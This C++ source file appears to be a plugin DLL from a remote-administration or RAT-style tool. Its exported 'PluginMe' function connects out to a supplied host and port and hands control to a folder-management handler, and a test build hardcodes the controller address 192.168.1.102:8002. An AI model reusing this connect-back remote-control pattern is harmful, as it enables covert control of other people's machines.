// SOFTWARE.cpp : Defines the entry point for the DLL application.
//

#include "ClientSocket.h"
#include "AppManager.h"
#pragma comment(lib,"kernel32.lib")
#pragma comment(lib,"user32.lib")
#pragma comment(lib,"advapi32.lib")

#if _DLL
#pragma comment(linker, "/ENTRY:_DllMain")
#pragma comment(linker,"/opt:nowin98")
#endif

BOOL APIENTRY _DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					   )
{
    return TRUE;
}

//文件夹管理
extern "C" __declspec(dllexport) BOOL PluginMe(LPCTSTR lpszHost, UINT nPort, LPBYTE lparam)     
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(lpszHost, nPort))
		return -1;
	
	CAppManager	manager(&socketClient);
	socketClient.run_event_loop();
	
	return 0;
}

#if _CONSOLE
#include <stdio.h>
int main()
{
	PluginMe("192.168.1.102",8002,NULL);
	return 0;
}
#endif
